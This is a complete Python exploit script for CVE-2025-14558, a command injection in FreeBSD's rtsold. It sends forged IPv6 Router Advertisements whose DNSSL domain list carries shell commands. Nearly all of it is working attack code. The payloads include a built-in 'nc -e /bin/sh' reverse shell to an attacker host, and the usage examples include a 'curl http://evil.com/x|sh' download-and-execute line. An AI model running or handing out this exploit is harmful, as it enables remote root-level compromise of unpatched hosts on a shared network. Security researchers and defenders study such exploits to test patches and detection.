#!/usr/bin/env python3
# Exploit Title: FreeBSD rtsold/rtsol - Remote Code Execution via Router Advertisement DNSSL
# Date: 2025-12-16
# Exploit Author: Lukas Johannes Möller
# Vendor Homepage: https://www.freebsd.org/
# Software Link: http://ftp-archive.freebsd.org/pub/FreeBSD-Archive/old-releases/
# Version: FreeBSD 13.x, 14.x, 15.x (before 2025-12-16 patches)
# Tested on: FreeBSD 14.1-RELEASE
# CVE: CVE-2025-14558
# References:
#   - https://security.FreeBSD.org/advisories/FreeBSD-SA-25:12.rtsold.asc
#   - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-14558
#
# Description:
#   The rtsol(8) and rtsold(8) programs do not validate the domain search
#   list options provided in IPv6 Router Advertisement messages. The option
#   body is passed to resolvconf(8) unmodified. Since resolvconf(8) is a
#   shell script that does not properly quote its input, shell metacharacters
#   in the DNSSL option can trigger arbitrary command execution.
#
# Requirements:
#   - Attacker must be on the same Layer 2 network segment as the target
#   - Target must be running rtsol/rtsold with ACCEPT_RTADV enabled
#   - Root privileges required to send raw packets
#   - Python 3 with Scapy library (pip install scapy)
#
# Usage:
#   python3 exploit.py -i <interface> -p '<payload>'
#   python3 exploit.py -i eth0 --rhost <attacker_ip> --rport 4444

import argparse
import struct
import sys
import time

try:
    from scapy.all import (
        Ether,
        IPv6,
        ICMPv6ND_RA,
        ICMPv6NDOptPrefixInfo,
        ICMPv6NDOptSrcLLAddr,
        Raw,
        get_if_hwaddr,
        sendp,
    )
except ImportError:
    print("[!] Scapy is required. Install with: pip install scapy")
    sys.exit(1)


class DNSSLExploit:
    """CVE-2025-14558: FreeBSD rtsold DNSSL Command Injection Exploit."""

    DNSSL_OPTION_TYPE = 31  # RFC 6106

    def __init__(self, interface, src_ip="fe80::1"):
        self.interface = interface
        self.src_ip = src_ip
        self.src_mac = self._get_mac()

    def _get_mac(self):
        """Get MAC address of the specified interface."""
        try:
            return get_if_hwaddr(self.interface)
        except Exception as e:
            print(f"[!] Failed to get MAC for {self.interface}: {e}")
            sys.exit(1)

    @staticmethod
    def _encode_domain(domain):
        """Encode domain name in DNS wire format (RFC 1035)."""
        encoded = b""
        for label in domain.split("."):
            if label:
                encoded += bytes([len(label)]) + label.encode("ascii")
        return encoded + b"\x00"

    def _build_dnssl_option(self, domains, lifetime=0xFFFFFFFF):
        """
        Build DNSSL option per RFC 6106.

        Format:
         0                   1                   2                   3
         0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |     Type      |    Length     |           Reserved            |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                           Lifetime                            |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                  Domain Names (variable length)               |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        """
        domain_data = b"".join(self._encode_domain(d) for d in domains)

        # Pad to 8-byte boundary
        padding = (8 - (len(domain_data) + 8) % 8) % 8
        domain_data += b"\x00" * padding

        # Length in 8-octet units
        length = (8 + len(domain_data)) // 8

        return (
            struct.pack(">BBH", self.DNSSL_OPTION_TYPE, length, 0)
            + struct.pack(">I", lifetime)
            + domain_data
        )

    def _build_packet(self, payload):
        """Construct malicious Router Advertisement with DNSSL payload."""
        # Embed payload between legitimate-looking domains
        domains = ["corp.local", payload, "internal.net"]
        dnssl = self._build_dnssl_option(domains)

        return (
            Ether(src=self.src_mac, dst="33:33:00:00:00:01")
            / IPv6(src=self.src_ip, dst="ff02::1", hlim=255)
            / ICMPv6ND_RA(chlim=64, M=0, O=1, routerlifetime=1800)
            / ICMPv6NDOptSrcLLAddr(lladdr=self.src_mac)
            / ICMPv6NDOptPrefixInfo(
                prefixlen=64,
                L=1,
                A=1,
                validlifetime=2592000,
                preferredlifetime=604800,
                prefix="2001:db8::",
            )
            / Raw(load=dnssl)
        )

    def exploit(self, payload, count=3, interval=1.0):
        """Send malicious Router Advertisement packets."""
        print(f"[*] CVE-2025-14558 - FreeBSD rtsold RCE")
        print(f"[*] Interface: {self.interface} ({self.src_mac})")
        print(f"[*] Source IP: {self.src_ip}")
        print(f"[*] Payload: {payload}")
        print(f"[*] Sending {count} RA packet(s)...\n")

        packet = self._build_packet(payload)

        for i in range(count):
            sendp(packet, iface=self.interface, verbose=False)
            print(f"[+] Sent RA {i + 1}/{count}")
            if i < count - 1:
                time.sleep(interval)

        print("\n[+] Done. Payload executed on vulnerable hosts with ACCEPT_RTADV.")


def get_payload(args):
    """Determine payload based on arguments."""
    if args.payload:
        return args.payload

    if args.rhost:
        return f"$(nc -e /bin/sh {args.rhost} {args.rport})"

    return "$(touch /tmp/pwned)"


def main():
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║  CVE-2025-14558 - FreeBSD rtsold Remote Code Execution    ║
    ║  Router Advertisement DNSSL Command Injection             ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)

    parser = argparse.ArgumentParser(
        description="FreeBSD rtsold RCE via malicious Router Advertisement",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -i eth0                                    # Default: touch /tmp/pwned
  %(prog)s -i eth0 -p '$(id > /tmp/pwned)'            # Custom command
  %(prog)s -i eth0 --rhost 10.0.0.1 --rport 4444      # Reverse shell
  %(prog)s -i eth0 -p '$(curl http://evil.com/x|sh)' # Download & execute
        """,
    )

    parser.add_argument(
        "-i", "--interface", required=True, help="Network interface (e.g., eth0, em0)"
    )
    parser.add_argument("-p", "--payload", help="Command injection payload")
    parser.add_argument("--rhost", help="Attacker IP for reverse shell")
    parser.add_argument(
        "--rport", type=int, default=4444, help="Attacker port (default: 4444)"
    )
    parser.add_argument(
        "--src-ip", default="fe80::1", help="Source IPv6 address (default: fe80::1)"
    )
    parser.add_argument(
        "-c", "--count", type=int, default=3, help="Number of packets (default: 3)"
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=1.0,
        help="Interval between packets (default: 1.0s)",
    )

    args = parser.parse_args()
    payload = get_payload(args)

    if args.rhost and not args.payload:
        print(f"[*] Reverse shell: nc -lvnp {args.rport}\n")

    exploit = DNSSLExploit(args.interface, args.src_ip)
    exploit.exploit(payload, args.count, args.interval)


if __name__ == "__main__":
    main()
